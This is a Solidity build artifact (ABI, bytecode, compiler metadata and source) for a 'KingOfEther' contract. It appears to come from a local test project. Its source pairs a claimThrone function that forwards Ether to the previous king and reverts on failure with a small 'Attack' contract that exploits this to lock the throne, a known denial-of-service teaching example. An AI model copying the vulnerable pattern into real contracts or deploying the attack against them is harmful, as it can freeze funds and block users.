{
  "contractName": "KingOfEther",
  "abi": [
    {
      "inputs": [],
      "name": "balance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "king",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "claimThrone",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610417806100206000396000f3fe6080604052600436106100345760003560e01c806369deb7b714610039578063b69ef8a814610043578063cc181ca81461006e575b600080fd5b610041610099565b005b34801561004f57600080fd5b506100586101f6565b604051610065919061036e565b60405180910390f35b34801561007a57600080fd5b506100836101fc565b6040516100909190610313565b60405180910390f35b60015434116100dd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100d49061034e565b60405180910390fd5b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600154604051610126906102fe565b60006040518083038185875af1925050503d8060008114610163576040519150601f19603f3d011682016040523d82523d6000602084013e610168565b606091505b50509050806101ac576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101a39061032e565b60405180910390fd5b34600181905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60015481565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b610229816103a5565b82525050565b600061023c601483610394565b91507f4661696c656420746f2073656e642045746865720000000000000000000000006000830152602082019050919050565b600061027c602383610394565b91507f4e65656420746f20706179206d6f726520746f206265636f6d6520746865206b60008301527f696e6700000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b60006102e2600083610389565b9150600082019050919050565b6102f8816103d7565b82525050565b6000610309826102d5565b9150819050919050565b60006020820190506103286000830184610220565b92915050565b600060208201905081810360008301526103478161022f565b9050919050565b600060208201905081810360008301526103678161026f565b9050919050565b600060208201905061038360008301846102ef565b92915050565b600081905092915050565b600082825260208201905092915050565b60006103b0826103b7565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600081905091905056fea2646970667358221220a54fa2f1d3331b90dba12513607d18ad9150e707a9146148bb266efd51ce128664736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract KingOfEther {\r\n    address public king;\r\n    uint public balance;\r\n    \r\n\r\n    function claimThrone() external payable {\r\n        require(msg.value > balance, \"Need to pay more to become the king\");\r\n\r\n       \r\n        (bool sent, ) = king.call{value: balance}(\"\");\r\n        require(sent, \"Failed to send Ether\");\r\n        balance = msg.value;\r\n        king = msg.sender;\r\n    }\r\n}\r\n\r\n\r\ncontract Attack {\r\n    KingOfEther kingOfEther;\r\n\r\n    constructor(KingOfEther _kingOfEther) {\r\n        kingOfEther = KingOfEther(_kingOfEther);\r\n    }\r\n    function attack() public payable {\r\n        kingOfEther.claimThrone{value: msg.value}();\r\n    }\r\n}",
  "sourcePath": "D:\\Test\\King\\contracts\\KingOfEther.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2023-09-08T08:59:58.693Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}